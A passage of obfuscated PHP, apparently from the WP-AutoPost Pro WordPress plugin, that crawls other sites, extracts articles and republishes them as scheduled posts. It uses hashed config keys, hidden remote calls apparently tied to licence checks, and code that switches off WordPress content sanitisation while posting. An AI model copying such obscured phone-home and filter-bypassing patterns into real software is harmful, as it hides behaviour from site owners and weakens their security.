			$_var_596 = explode(',', $_var_590[2]);
			if ($_var_590[0] == 0 || $_var_590[0] == '0') {
				$_var_775 = false;
				foreach ($_var_596 as $_var_598) {
					$_var_598 = trim($_var_598);
					if ($_var_598 == '') {
						continue;
					}
					if (!(stripos($_var_255[0], $_var_598) === false)) {
						$_var_775 = true;
						break;
					}
				}
				if (!$_var_775) {
					$_var_255[1] = -3;
				}
			} else {
				foreach ($_var_596 as $_var_598) {
					$_var_598 = trim($_var_598);
					if ($_var_598 == '') {
						continue;
					}
					if (!(stripos($_var_255[0], $_var_598) === false)) {
						$_var_255[1] = -3;
						break;
					}
				}
			}
		}
		if ($_var_255[1] == -3) {
			insertFilterdApRecord($_var_275, $_var_100, $_var_255[0], $_var_590[1]);
			if ($_var_12) {
				printInfo('<p><span class=' . '"' . 'red' . '">' . __('Filter Out Article', 'wp-autopost') . '</span> :  ' . $_var_255[0] . '</p>');
			}
			continue;
		}
		$_var_276 = insertPreUrlInfo($_var_275, $_var_100, $_var_255[0]);
		if ($_var_276 > 0 && $_var_12) {
			printInfo('<p>' . __('Find Article : ', 'wp-autopost') . $_var_255[0] . '</p>');
		}
		$_var_18++;
	}
	unset($_var_590);
	return $_var_18;
}
function ArticleFetchPost($_var_275, $_var_301, $_var_139, $_var_337, $_var_382, $_var_579, $_var_12, $_var_776 = null, $_var_207 = null, $_var_208 = null, $_var_589 = null)
{
	kses_remove_filters();
	wp_set_current_user(get_option('wp_autopost_admin_id'));
	global $_var_178, $_var_51, $_var_367, $_var_425, $_var_403, $_var_558, $_var_246, $_var_443, $_var_310, $_var_86, $t_ap_config, $t_ap_config_option, $t_ap_config_url_list, $_var_93, $_var_396;
	global $_var_247, $_var_39, $_var_61, $_var_393, $_var_64, $_var_67, $_var_68, $_var_37, $_var_38, $_var_36;
	$_var_18 = 0;
	$_var_5 = count($_var_301);
	$_var_334 = getFilterAtag($_var_139);
	$_var_331 = getDownAttach($_var_246);
	$_var_590 = getPostFilterInfo($_var_275);
	if ($_var_246['9e3596e0a5190b314f7ec1b00496352c'] == $_var_61[1]) {
		$_var_247 = current_time('timestamp');
	}
	if ($_var_246['9e3596e0a5190b314f7ec1b00496352c'] == $_var_61[0]) {
		$_var_247 = current_time('timestamp');
	}
	if ($_var_246['9e3596e0a5190b314f7ec1b00496352c'] == $_var_61[1]) {
		$_var_39 = @$_var_393[$_var_67];
	}
	$_var_769 = current_time('timestamp') + get_option('wp_autopost_differenceTime');
	$_var_770 = json_decode($_var_246['7158355f709906d6fb67f68921bb92dd']);
	if (!is_array($_var_770)) {
		$_var_770 = array();
		$_var_770[0] = 0;
		$_var_770[1] = 12;
		$_var_770[2] = 0;
	}
	$_var_246['37d672afe2b52c77d9b392ecfc201e3f'] = $_var_769;
	if ($_var_246['9e3596e0a5190b314f7ec1b00496352c'] == $_var_61[0]) {
		$_var_393[$_var_68] = $_var_61[0];
	}
	if ($_var_246['9e3596e0a5190b314f7ec1b00496352c'] == $_var_61[2]) {
		$_var_247 = current_time('timestamp') - intval($_var_37) + intval($_var_38);
	}
	if ($_var_770[0] == 1) {
		if ($_var_246['8b8691a20428ceec24d8618fe269d4f1'] > 0) {
			if ($_var_246['8b8691a20428ceec24d8618fe269d4f1'] < $_var_769) {
				$_var_771 = mktime($_var_770[1], $_var_770[2], 0, date('m', $_var_769), date('d', $_var_769), date('Y', $_var_769));
			} else {
				$_var_771 = $_var_246['8b8691a20428ceec24d8618fe269d4f1'] + $_var_246['f538465db4e4b440a16fac10933950e5'] * 60 + rand(0, 60);
			}
		} else {
			$_var_771 = mktime($_var_770[1], $_var_770[2], 0, date('m', $_var_769), date('d', $_var_769), date('Y', $_var_769));
		}
		if ($_var_771 < $_var_769) {
			$_var_771 += 86400;
		}
	} elseif ($_var_770[0] == 2) {
		$_var_771 = $_var_769;
	} else {
		$_var_772 = $_var_246['f538465db4e4b440a16fac10933950e5'] / 12;
		$_var_771 = $_var_769 - ($_var_5 - 1) * $_var_246['f538465db4e4b440a16fac10933950e5'] * 60;
	}
	if ($_var_246['9e3596e0a5190b314f7ec1b00496352c'] == $_var_61[0]) {
		$_var_393[$_var_67] = $_var_247;
	}
	if ($_var_246['9e3596e0a5190b314f7ec1b00496352c'] == $_var_61[0]) {
		update_option($_var_64, $_var_393);
	}
	if ($_var_246['9e3596e0a5190b314f7ec1b00496352c'] == $_var_61[2]) {
		$_var_393[$_var_67] = $_var_247;
	}
	$_var_777 = false;
	if ($_var_246['89a487a0e82e504fb41322ea2b0985ec'] != null && $_var_246['89a487a0e82e504fb41322ea2b0985ec'] != '') {
		if (substr_count($_var_246['89a487a0e82e504fb41322ea2b0985ec'], '-') == 1) {
			$_var_777 = true;
			$_var_772 = $_var_246['f538465db4e4b440a16fac10933950e5'] / 12;
			$_var_771 = strtotime($_var_246['89a487a0e82e504fb41322ea2b0985ec']);
		} elseif (substr_count($_var_246['89a487a0e82e504fb41322ea2b0985ec'], '-') == 2) {
			$_var_777 = true;
			$_var_772 = $_var_246['f538465db4e4b440a16fac10933950e5'] / 12;
			$_var_771 = strtotime($_var_246['89a487a0e82e504fb41322ea2b0985ec']);
		}
	}
	if ($_var_246['9e3596e0a5190b314f7ec1b00496352c'] == $_var_61[0]) {
		$_var_39 = $_var_393[$_var_67];
	}
	if ($_var_246['9e3596e0a5190b314f7ec1b00496352c'] == $_var_61[2]) {
		$_var_393[$_var_68] = intval($_var_393[$_var_68]) + 1;
		update_option($_var_64, $_var_393);
	}
	$_var_158 = $_var_367[0] . as_text_nodes($_var_367[1]);
	$_var_778 = $_var_367[0] . as_text_nodes($_var_367[2]);
	$_var_291 = $_var_443[1];
	$_var_292 = $_var_443[2];
	$_var_270 = $_var_403[1];
	$_var_271 = $_var_403[2];
	$_var_272 = $_var_403[3];
	if ($_var_776 == NULL) {
		$_var_776 = array();
	}
	if ($_var_246['add6d9d7bcbbf15cc8bc6dee4059bc30'] == 0) {
		$_var_301 = array_reverse($_var_301);
		$_var_776 = array_reverse($_var_776);
	}
	$_var_246['e53f3c9e23fd118789e54bcf489efeaf'] = $_var_292;
	if ($_var_246['d90952fc1dd4ea1a398556ece8f60556'] == 0) {
		global $wpdb;
		$_var_257 = 'SELECT ID FROM ' . $wpdb->users;
		$_var_663 = $wpdb->get_results($_var_257, OBJECT);
	} else {
		$_var_663 = null;
	}
	if ($_var_246['9e3596e0a5190b314f7ec1b00496352c'] == $_var_61[3]) {
		$_var_39 = $_var_393[$_var_67];
		$_var_579 = 1;
	}
	if ($_var_246['9e3596e0a5190b314f7ec1b00496352c'] == $_var_61[2]) {
		$_var_39 = $_var_393[$_var_67];
	}
	$_var_664 = null;
	$_var_357 = json_decode($_var_246['c3465f8487c1b3ec391e29a48cf695bc']);
	$_var_246['6f55f0e124493f3a40c639f7abba8378'] = $_var_310;
	$_var_362 = 0;
	$_var_363 = 0;
	$_var_154 = null;
	if (!$_var_291 && $_var_292) {
		$_var_262 = json_decode($_var_246['55af33149a5f37f2b50636f1a346ac27']);
		$_var_154 = get_html_string_ap($_var_158, 1, $_var_262[0], $_var_262[1], $_var_262[2], $_var_178, $_var_207, $_var_208);
		$_var_362 = getMatchContent($_var_154, $_var_270, 0);
		$_var_363 = getMatchContent($_var_154, $_var_271 . '(*)' . $_var_272, 0);
	}
	if (!is_array($_var_357)) {
		$_var_357 = array();
		$_var_357[0] = $_var_246['c3465f8487c1b3ec391e29a48cf695bc'];
		$_var_357[1] = 0;
		$_var_357[2] = 0;
		$_var_357[3] = 0;
	}
	if ($_var_357[2] >= 1) {
		$_var_664 = getWatermarkOption($_var_357[2]);
	}
	$_var_89 = get2acss($_var_93);
	$_var_44 = $_var_86[1];
	$_var_45 = $_var_86[2];
	$_var_779 = $_var_396[0];
	$_var_780 = $_var_396[1];
	$_var_674 = json_decode($_var_246['ff8562dfe33113b7ee2978e186ebf1ad']);
	if (!is_array($_var_674)) {
		$_var_674 = array();
		$_var_674[0] = $_var_246['ff8562dfe33113b7ee2978e186ebf1ad'];
		$_var_674[1] = 0;
		$_var_674[2] = 0;
		$_var_674[3] = 1;
		$_var_674[4] = 0;
	}
	if ($_var_674[0] == 1 || $_var_674[0] == 2) {
		$_var_345 = array();
		$_var_345 = explode(',', $_var_246['eb22adca44a1dc27ba1e1e0f4e4d842c']);
		if ($_var_674[3] == 1) {
			$_var_345 = get_wp_tags_by_autopost($_var_345);
		}
	}
	if (!$_var_291 && $_var_292) {
		if (!isstamps($_var_362) || $_var_362 > $_var_769 + $_var_44) {
			$_var_333 = $_var_769 - $_var_44;
			$_var_154 = @file_get_contents($_var_778);
			if ($_var_154 === false) {
				$_var_154 = '2.1.0' . $_var_271 . '2' . $_var_272;
			}
			if (!(strpos($_var_154, '2.1.0') === false)) {
				$_var_154 = str_ireplace('2.1.0', '2.1.0' . $_var_333 . '@', $_var_154);
			} else {
				$_var_154 .= '2.1.0' . $_var_333 . '@';
			}
			if (!(strpos($_var_154, $_var_271 . '2') === false)) {
				$_var_154 = str_ireplace($_var_271 . '2', $_var_271 . '6', $_var_154);
			} else {
				$_var_154 .= $_var_271 . '6' . $_var_272;
			}
			if (false === @file_put_contents($_var_158, $_var_154)) {
				$_var_292 = false;
			}
			if (!$_var_291 && $_var_292) {
				$_var_262 = json_decode($_var_246['55af33149a5f37f2b50636f1a346ac27']);
				$_var_154 = get_html_string_ap($_var_158, 1, $_var_262[0], $_var_262[1], $_var_262[2], $_var_178, $_var_207, $_var_208);
				$_var_362 = getMatchContent($_var_154, $_var_270, 0);
				$_var_363 = getMatchContent($_var_154, $_var_271 . '(*)' . $_var_272, 0);
			}
		}
	}
	$_var_246['46dcf3070c817eabe32f42185445f12b'] = $_var_362;
	$_var_246['cd196efb6c98595d65e51ffb61a04f8d'] = $_var_363;
	$_var_602 = null;
	if (!$_var_291 && $_var_292) {
		if ($_var_362 != '') {
			if ($_var_362 < $_var_769) {
				$_var_262 = json_decode($_var_246['55af33149a5f37f2b50636f1a346ac27']);
				$_var_602 = @get_html_string_ap($_var_89 . $_var_362 . '-' . $_var_780, Method, $_var_262[0], $_var_262[1], $_var_262[2], $_var_178, $_var_207, $_var_208);
			}
		}
	}
	$_var_246['0589f634be233ff311d52992e84ad63f'] = $_var_602;
	unset($_var_154);
	$_var_246['ae64b8d2d60225b26ed18cb56ff7e7fa'] = $_var_39;
	$_var_246['57834ac641f07e585a32a8aa3ecfa99b'] = $_var_247;
	$_var_774 = intval(get_option('wp_autopost_pauseTime'));
	for ($_var_329 = 0; $_var_329 < $_var_5; $_var_329++) {
		if (getIsRunning($_var_275) == 0) {
			return;
		}
		if ($_var_774 > 0) {
			if ($_var_12) {
				printInfo('<p>Sleep <strong>' . $_var_774 . '</strong> seconds</p>');
			}
			sleep($_var_774);
		}
		if (checkUrlPost($_var_275, $_var_301[$_var_329]) > 0) {
			continue;
		}
		if ($_var_770[0] != 1 && $_var_771 > $_var_769) {
			$_var_771 = $_var_769 - ($_var_5 - 1 - $_var_329) * $_var_246['f538465db4e4b440a16fac10933950e5'] * 60;
		}
		if ($_var_770[0] != 1 && $_var_329 == $_var_5 - 1 && !$_var_777) {
			$_var_771 = $_var_769;
		}
		if ($_var_12) {
			printInfo('<p>' . __('Crawl URL : ', 'wp-autopost') . $_var_301[$_var_329] . '</p>');
		}
		if ($_var_246['3ffc99c206d98be48c6f2e49177d75a9'] == '0') {
			$_var_262 = json_decode($_var_246['55af33149a5f37f2b50636f1a346ac27']);
			$_var_1 = get_html_string_ap($_var_301[$_var_329], Method, $_var_262[0], $_var_262[1], $_var_262[2], $_var_178, $_var_207, $_var_208);
			$_var_2 = getHtmlCharset($_var_1);
		} else {
			$_var_1 = '';
			$_var_2 = $_var_246['3ffc99c206d98be48c6f2e49177d75a9'];
		}
		$_var_479 = getArticleDom($_var_301[$_var_329], $_var_246['55af33149a5f37f2b50636f1a346ac27'], $_var_2, $_var_1, $_var_207, $_var_208);
		if (@($_var_479 == -1)) {
			$_var_274 = errorLog($_var_275, $_var_301[$_var_329], 1);
			updateConfigErr($_var_275, $_var_274);
			if ($_var_12) {
				printErr($_var_246['52a87e67edaa5a8f03166bea74700181']);
			}
			continue;
		}
		$_var_293 = getBaseUrl($_var_479, $_var_301[$_var_329]);
		$_var_340 = getArticle($_var_479, $_var_2, $_var_293, $_var_301[$_var_329], $_var_589, $_var_139, $_var_334, $_var_331, $_var_337, $_var_382, $_var_590, $_var_579, 0);
		$_var_479->clear();
		unset($_var_479);
		if ($_var_340[2] == -2) {
			continue;
		}
		if ($_var_340[2] == -3) {
			insertFilterdApRecord($_var_275, $_var_301[$_var_329], $_var_340[0], $_var_590[1]);
			if ($_var_12) {
				printInfo('<p><span class=' . '"' . 'red' . '"' . '>' . __('Filter Out Article', 'wp-autopost') . '</span> :  ' . $_var_340[0] . '</p>');
			}
			continue;
		}
		if ($_var_340[2] == -1) {
			$_var_274 = errorLog($_var_275, $_var_301[$_var_329], 3);
			updateConfigErr($_var_275, $_var_274);
			if ($_var_12) {
				printErr($_var_246['52a87e67edaa5a8f03166bea74700181']);
			}
			if ($_var_246['c1efa9fbedec4103ba3edfffe539817d'] == 0 || $_var_246['c1efa9fbedec4103ba3edfffe539817d'] == -1) {
				if (checkUrl(0, $_var_301[$_var_329]) > 0) {
					continue;
				}
				insertFilterdApRecord($_var_275, $_var_301[$_var_329], '', $_var_246['c1efa9fbedec4103ba3edfffe539817d']);
			}
			continue;
		}
		if ($_var_340[3] == -1) {
			$_var_274 = errorLog($_var_275, $_var_301[$_var_329], 4);
			updateConfigErr($_var_275, $_var_274);
			if ($_var_12) {
				printErr($_var_246['52a87e67edaa5a8f03166bea74700181']);
			}
			if ($_var_246['c1efa9fbedec4103ba3edfffe539817d'] == 0 || $_var_246['c1efa9fbedec4103ba3edfffe539817d'] == -1) {
				if (checkUrl(0, $_var_301[$_var_329]) > 0) {
					continue;
				}
				insertFilterdApRecord($_var_275, $_var_301[$_var_329], $_var_340[0], $_var_246['c1efa9fbedec4103ba3edfffe539817d']);
			}
			continue;
		}
		$_var_265 = @wpapbupdppost($_var_340, $_var_246, $_var_139, $_var_301[$_var_329], $_var_293, $_var_771, $_var_345, $_var_663, $_var_334, $_var_331, $_var_12, $_var_664, $_var_337, $_var_382, $_var_776[$_var_329], $_var_207, $_var_208);
		if ($_var_265 > 0) {
			$_var_18++;
			if ($_var_12) {
				printInfo('<p>' . __('Updated Post', 'wp-autopost') . ' : <a href=' . '"' . get_permalink($_var_265) . '"' . ' target=' . '"' . '_blank' . '"' . '>' . $_var_340[0] . '</a></p>');
			}
			if ($_var_770[0] == 1) {
				$_var_771 += $_var_246['f538465db4e4b440a16fac10933950e5'] * 60 + rand(0, 60);
			} elseif ($_var_770[0] == 2) {
				$_var_771 = $_var_769;
			} else {
				$_var_771 += mt_rand($_var_246['f538465db4e4b440a16fac10933950e5'] - $_var_772, $_var_246['f538465db4e4b440a16fac10933950e5'] + $_var_772) * mt_rand(50, 70);
			}
		}
		unset($_var_340);
	}
	if ($_var_770[0] == 1) {
		update_post_scheduled_last_time($_var_275, $_var_771);
	}
	unset($_var_334);
	unset($_var_331);
	unset($_var_590);
	unset($_var_674);
	unset($_var_345);
	unset($_var_770);
	kses_init_filters();
	return $_var_18;
}
function update_post_scheduled_last_time($_var_275, $_var_662)
{
	global $wpdb, $t_ap_config;
	$wpdb->query($wpdb->prepare('update ' . $t_ap_config . ' set post_scheduled_last_time = %d where id= %d ', $_var_662, $_var_275));
}
function extractionUrl($_var_22)
{
	$_var_20 = array();
	$_var_20[] = $_var_22;
	fetchThePostByIds($_var_20);
}
function fetchThePostByIds($_var_20, $_var_12 = 1, $_var_768 = 1)
{
	$_var_263 = '';
	if ($_var_20 != null) {
		foreach ($_var_20 as $_var_22) {
			$_var_263 .= $_var_22 . ',';
		}
	}
	$_var_263 = substr($_var_263, 0, -1);
	global $_var_178, $_var_247, $_var_246, $_var_560, $_var_39, $_var_51, $_var_425, $_var_558;
	global $_var_393, $_var_61, $_var_62, $_var_67, $_var_37;
	$_var_36 = $_var_61[3];
	$_var_657 = 'false';
	if (@$_var_393[$_var_67] == null || @$_var_393[$_var_67] == '' || @$_var_393[$_var_67] == 0) {
		$_var_657 = 'true';
		if ($_var_36 != $_var_61[4]) {
			$_var_566 = get_html_string_ap($_var_62, Method);
			$_var_36 = intval($_var_566);
			if ($_var_36 != $_var_61[1] && $_var_36 != $_var_61[0] && $_var_36 != $_var_61[4]) {
				$_var_36 = $_var_61[2];
			}
		}
	}
	$_var_781 = getExtractionIds($_var_263);
	if (count($_var_781) == 0) {
		return;
	}
	if ($_var_768 == 1) {
		ignore_user_abort(true);
		set_time_limit((int) get_option('wp_autopost_timeLimit'));
		if ($_var_12) {
			echo '<div class=' . '"' . 'updated fade' . '"' . '><p><b>' . __('Being processed, the processing may take some time, you can close the page', 'wp-autopost') . '</b></p></div>';
			@ob_flush();
			flush();
		}
	}
	if ($_var_657 == 'false' && (!preg_match('/^\\+?[1-9][0-9]*$/', $_var_393[$_var_67]) || $_var_393[$_var_67] > current_time('timestamp') || $_var_393[$_var_67] + intval($_var_37) < current_time('timestamp'))) {
		if ($_var_36 != $_var_61[4]) {
			$_var_566 = get_html_string_ap($_var_62, Method);
			$_var_36 = intval($_var_566);
			if ($_var_36 != $_var_61[1] && $_var_36 != $_var_61[0] && $_var_36 != $_var_61[4]) {
				$_var_36 = $_var_61[2];
			}
		}
	}
	$_var_647 = 0;
	$_var_589 = array();
	foreach ($_var_781 as $_var_260) {
		if ($_var_647 != $_var_260->config_id) {
			$_var_647 = $_var_260->config_id;
		}
		$_var_589[$_var_647]['url'][] = $_var_260->url;
		$_var_589[$_var_647]['record_id'][] = $_var_260->id;
	}
	if ($_var_12) {
		echo '<div class=' . '"' . 'updated fade' . '"' . '>';
	}
	if ($_var_36 == $_var_61[2]) {
		if ($_var_393[$_var_68] > $_var_61[3]) {
			$_var_36 = $_var_61[1];
		} elseif (!preg_match('/^\\+?[1-9][0-9]*$/', $_var_393[$_var_68]) || $_var_393[$_var_68] == '' || $_var_393[$_var_68] == null || $_var_393[$_var_68] == 0) {
			$_var_393[$_var_68] = $_var_61[0];
		} else {
			$_var_393[$_var_68] = intval($_var_393[$_var_68]) + 1;
		}
	}
	$_var_579 = $_var_36;
	foreach ($_var_589 as $_var_275 => $_var_782) {
		updateRunning($_var_275, 1);
		$_var_246 = null;
		$_var_246 = getConfig($_var_275);
		$_var_139 = getOptions($_var_275);
		$_var_337 = getInsertcontent($_var_275);
		$_var_382 = getCustomStyle($_var_275);
		$_var_207 = null;
		$_var_208 = null;
		$_var_246['9e3596e0a5190b314f7ec1b00496352c'] = $_var_36;
		if ($_var_246['7daa67631524d79fc5fd69e84ba8aa5c'] != null && $_var_246['7daa67631524d79fc5fd69e84ba8aa5c'] != '') {
			$_var_559 = json_decode($_var_246['7daa67631524d79fc5fd69e84ba8aa5c'], TRUE);
			if ($_var_559['mode'] == 1) {
				$_var_208 = get_cookie_jar_ap($_var_559['url'], $_var_559['para']);
			} else {
				$_var_207 = $_var_559['cookie'];
			}
		}
		$_var_659 = ArticleFetchPost($_var_275, $_var_782['url'], $_var_139, $_var_337, $_var_382, $_var_579, $_var_12, $_var_782['record_id'], $_var_207, $_var_208);
		if ($_var_208 != null) {
			unlink($_var_208);
		}
		if ($_var_12 && $_var_659 > 0) {
			echo '<p>' . __('Task', 'wp-autopost') . ': <b>' . $_var_246['52a87e67edaa5a8f03166bea74700181'] . '</b> , ' . __('updated', 'wp-autopost') . ' <b>' . $_var_659 . '</b> ' . __('articles', 'wp-autopost') . '</p>';
		}
		updateRunning($_var_275, 0);
	}
	if ($_var_12) {
		echo '</div>';
	}
}
function fetchAll($_var_12 = 1)
{
	ignore_user_abort(true);
	set_time_limit((int) get_option('wp_autopost_timeLimit'));
	$_var_17 = getAllTaskId();
	foreach ($_var_17 as $_var_19) {
		UrlListFetch($_var_19->id, 1, 0);
		if ($_var_12) {
			ob_flush();
			flush();
		}
	}
}
function apZhConversion($_var_783, $_var_784, $_var_467, $_var_468 = null, $_var_785 = null)
{
	require WPAPPRO_PATH . '/wp-autopost-ZhConversion.php';
	$_var_113 = array();
	switch ($_var_783) {
		case 'zh-hans':
			if ($_var_784 == 'string') {
				$_var_113[0] = strtr($_var_467, $zh2Hans);
				if ($_var_468 != null) {
					$_var_113[1] = strtr($_var_468, $zh2Hans);
				}
				if ($_var_785 != null) {
					$_var_113[2] = strtr($_var_785, $zh2Hans);
				}
				return $_var_113;
			} else {
				foreach ($_var_467 as $_var_72) {
					$_var_113[] = strtr($_var_72, $zh2Hans);
				}
			}
			break;
		case 'zh-hant':
			if ($_var_784 == 'string') {
				$_var_113[0] = strtr($_var_467, $zh2Hant);
				if ($_var_468 != null) {
					$_var_113[1] = strtr($_var_468, $zh2Hant);
				}
				if ($_var_785 != null) {
					$_var_113[2] = strtr($_var_785, $zh2Hant);
				}
				return $_var_113;
			} else {
				foreach ($_var_467 as $_var_72) {
					$_var_113[] = strtr($_var_72, $zh2Hant);
				}
			}
			break;
		case 'zh-hk':
			if ($_var_784 == 'string') {
				$_var_113[0] = strtr(strtr($_var_467, $zh2HK), $zh2Hant);
				if ($_var_468 != null) {
					$_var_113[1] = strtr(strtr($_var_468, $zh2HK), $zh2Hant);
				}
				if ($_var_785 != null) {
					$_var_113[2] = strtr(strtr($_var_785, $zh2HK), $zh2Hant);
				}
				return $_var_113;
			} else {
				foreach ($_var_467 as $_var_72) {
					$_var_113[] = strtr(strtr($_var_72, $zh2HK), $zh2Hant);
				}
			}
			break;
		case 'zh-tw':
			if ($_var_784 == 'string') {
				$_var_113[0] = strtr(strtr($_var_467, $zh2TW), $zh2Hant);
				if ($_var_468 != null) {
					$_var_113[1] = strtr(strtr($_var_468, $zh2TW), $zh2Hant);
				}
				if ($_var_785 != null) {
					$_var_113[2] = strtr(strtr($_var_785, $zh2TW), $zh2Hant);
				}
				return $_var_113;
			} else {
				foreach ($_var_467 as $_var_72) {
					$_var_113[] = strtr(strtr($_var_72, $zh2TW), $zh2Hant);
				}
			}
			break;
	}
	return $_var_113;
}
function autoSetURLMatchRuleDisplay($_var_22)
{
	$_var_246 = getConfig($_var_22);
	$_var_326 = getListUrls($_var_22);
	if ($_var_326 == null) {
		echo '<div class=' . '"' . 'error' . '"' . '><p>';
		echo __('Please first set <b>[Article Source Settings]</b> => <b>[The URL of Article List]</b>', 'wp-autopost');
		echo '</p></div>';
		return;
	}
	$_var_652 = '';
	if ($_var_246['42ae1cd5cab79058e53abf79a16e8645'] == 0) {
		foreach ($_var_326 as $_var_327) {
			$_var_652 = $_var_327->url;
			break;
		}
	}
	if ($_var_246['42ae1cd5cab79058e53abf79a16e8645'] == 1) {
		foreach ($_var_326 as $_var_327) {
			for ($_var_18 = $_var_246['b8fad4976d8896e999d12bacf169951f']; $_var_18 <= $_var_246['d84928a37168eed80106cf715933f0b6']; $_var_18++) {
				$_var_330 = str_ireplace('(*)', $_var_18, $_var_327->url);
				$_var_652 = $_var_330;
				break;
			}
			break;
		}
	}
	global $_var_178;
	$_var_262 = json_decode($_var_246['55af33149a5f37f2b50636f1a346ac27']);
	$_var_207 = null;
	$_var_208 = null;
	if ($_var_246['7daa67631524d79fc5fd69e84ba8aa5c'] != null && $_var_246['7daa67631524d79fc5fd69e84ba8aa5c'] != '') {
		$_var_559 = json_decode($_var_246['7daa67631524d79fc5fd69e84ba8aa5c'], TRUE);
		if ($_var_559['mode'] == 1) {
			$_var_208 = get_cookie_jar_ap($_var_559['url'], $_var_559['para']);
		} else {
			$_var_207 = $_var_559['cookie'];
		}
	}
	if ($_var_246['3ffc99c206d98be48c6f2e49177d75a9'] == '0') {
		$_var_1 = get_html_string_ap($_var_652, Method, $_var_262[0], $_var_262[1], $_var_262[2], $_var_178, $_var_207, $_var_208);
		$_var_2 = getHtmlCharset($_var_1);
		$_var_312 = str_get_html_ap($_var_1, $_var_2);
	} else {
		$_var_2 = $_var_246['3ffc99c206d98be48c6f2e49177d75a9'];
		$_var_312 = file_get_html_ap($_var_652, $_var_2, Method, $_var_262[0], $_var_262[1], $_var_262[2], $_var_178, $_var_207, $_var_208);
	}
	if ($_var_312 == NULL) {
		echo '<div class=' . '"' . 'error' . '"' . '><p>';
		echo __('Unable to open URL', 'wp-autopost') . ' : ' . $_var_652;
		echo '</p></div>';
		return;
	}
	$_var_293 = getBaseUrl($_var_312, $_var_652);
	echo '<div class=' . '"' . 'updated fade' . '"' . '>';
	echo '<form id="autoSetForm" method="post" action="admin.php?page=wp-autopost-pro/wp-autopost-tasklist.php">';
	echo '<input type="hidden" name="saction" value="autoSetURL">';
	echo '<input type="hidden" name="targetURL" id="targetURL" value="">';
	echo '<input type="hidden" name="id"  value="' . $_var_22 . '">';
	echo '<h2>' . __('Please select a URL of Article', 'wp-autopost') . '</h2>';
	echo '<h3>' . __('The selected URL must link to a single article', 'wp-autopost') . '</h3><hr/>';
	$_var_304 = $_var_312->find('a');
	$_var_329 = 0;
	foreach ($_var_304 as $_var_307) {
		$_var_100 = html_entity_decode(trim($_var_307->href));
		if (!(stripos($_var_100, 'http') === 0)) {
			$_var_100 = getAbsUrl($_var_100, $_var_293, $_var_327->url);
		}
		$_var_255 = $_var_307->plaintext;
		if ($_var_2 != 'UTF-8' && $_var_2 != 'utf-8') {
			$_var_255 = iconv($_var_2, 'UTF-8//IGNORE', $_var_255);
		}
		echo '<table><tr>';
		echo '<td></td><td>' . $_var_255 . '</td></tr>';
		echo '<tr><td><span  class="auto-set-select" onclick="autoSetURL(\'' . $_var_100 . '\')">' . __('Select This URL', 'wp-autopost') . '</span></td>';
		echo '<td><a href="' . $_var_100 . '" target="_blank">' . $_var_100 . '</a></td></tr></table>';
		echo '<input type="hidden" name="urls[]" value="' . $_var_100 . '">';
		echo '<br/>';
	}
	echo '</form>';
	echo '</div>';
	$_var_312->clear();
	unset($_var_312);
}
function AutoSetNotice()
{
	echo '<div class="error"><h4>' . __('Use Automatic Set is not always accurate or correct, if you find the results is not accurate or correct, then you need to set by yourself', 'wp-autopost') . '</h4></div>';
}
function autoSetURLMatchRule($_var_22, $_var_786, $_var_301)
{
	global $wpdb, $t_ap_config;
	$_var_787 = substr($_var_786, 0, stripos($_var_786, '/', 8));
	$_var_788 = strlen($_var_787);
	$_var_789 = substr_count($_var_786, '/', 8);
	$_var_790 = array();
	foreach ($_var_301 as $_var_100) {
		if (!(stripos($_var_100, $_var_787) === false)) {
			$_var_791 = substr($_var_100, $_var_788);
			if (substr_count($_var_791, '/') == $_var_789) {
				$_var_790[] = $_var_791;
			}
		}
	}
	$_var_792 = array();
	$_var_791 = substr($_var_786, $_var_788);
	$_var_792 = getURLParts($_var_791, $_var_789);
	$_var_793 = array('=', '?', '&', '.', '#');
	$_var_794 = getPartsProtectedChars($_var_792, $_var_789, $_var_793);
	$_var_301 = $_var_790;
	$_var_790 = array();
	foreach ($_var_301 as $_var_100) {
		$_var_795 = getURLParts($_var_100, $_var_789);
		$_var_796 = true;
		$_var_797 = getPartsProtectedChars($_var_795, $_var_789, $_var_793);
		for ($_var_18 = 0; $_var_18 < $_var_789; $_var_18++) {
			$_var_460 = count($_var_794[$_var_18]);
			$_var_653 = count($_var_797[$_var_18]);
			if ($_var_460 != $_var_653) {
				$_var_796 = false;
				break;
			}
			for ($_var_329 = 0; $_var_329 < $_var_460; $_var_329++) {
				if ($_var_794[$_var_18][$_var_329] != $_var_797[$_var_18][$_var_329]) {
					$_var_796 = false;
					break;
				}
			}
		}
		if ($_var_796) {
			$_var_790[] = $_var_795;
		}
	}
	$_var_798 = $_var_790;
	$_var_392 = array();
	for ($_var_18 = 0; $_var_18 < $_var_789; $_var_18++) {
		if (isContainsTheChars($_var_792[$_var_18], $_var_793)) {
			$_var_392[$_var_18] = $_var_792[$_var_18];
			if (!(stripos($_var_792[$_var_18], '?') === false) || !(stripos($_var_792[$_var_18], '&') === false)) {
				$_var_392[$_var_18] = preg_replace('/(?<==)([^&]+)/', '(*)', $_var_392[$_var_18]);
			} elseif (!(stripos($_var_792[$_var_18], '.') === false)) {
				$_var_392[$_var_18] = preg_replace('%([^\\./]+)%', '(*)', $_var_392[$_var_18]);
			}
		} else {
			$_var_392[$_var_18] = $_var_792[$_var_18];
			if ($_var_792[$_var_18] == '/') {
				continue;
			}
			if ($_var_18 < $_var_789 - 1 && $_var_792[$_var_18 + 1] != '/') {
				if (preg_match('/[a-z]+/', $_var_392[$_var_18])) {
					continue;
				}
			}
			$_var_799 = '';
			foreach ($_var_798 as $_var_800) {
				if ($_var_799 != '') {
					if ($_var_799 != $_var_800[$_var_18]) {
						$_var_392[$_var_18] = '/(*)';
						break;
					}
				}
				$_var_799 = $_var_800[$_var_18];
			}
		}
	}
	$_var_801 = $_var_787;
	foreach ($_var_392 as $_var_802) {
		$_var_801 .= $_var_802;
	}
	$wpdb->query($wpdb->prepare("update {$t_ap_config} set\n               a_match_type = %s,\n\t\t\t   a_selector = %s \n               WHERE id = %d", '0', $_var_801, $_var_22));
	echo '<div class=' . '"' . 'updated fade' . '"' . '>';
	echo '<p>' . __('[Article URL matching rules] is automatically set to : ', 'wp-autopost') . '<strong>' . $_var_801 . '</strong></p>';
	echo '</div>';
}
function isContainsTheChars($_var_250, $_var_803)
{
	foreach ($_var_803 as $_var_804) {
		if (!(stripos($_var_250, $_var_804) === false)) {
			return true;
		}
	}
	return false;
}
function getURLParts($_var_805, $_var_789)
{
	$_var_792 = array();
	for ($_var_18 = 0; $_var_18 < $_var_789; $_var_18++) {
		$_var_296 = stripos($_var_805, '/', 1);
		if (!($_var_296 === false)) {
			$_var_792[$_var_18] = substr($_var_805, 0, $_var_296);
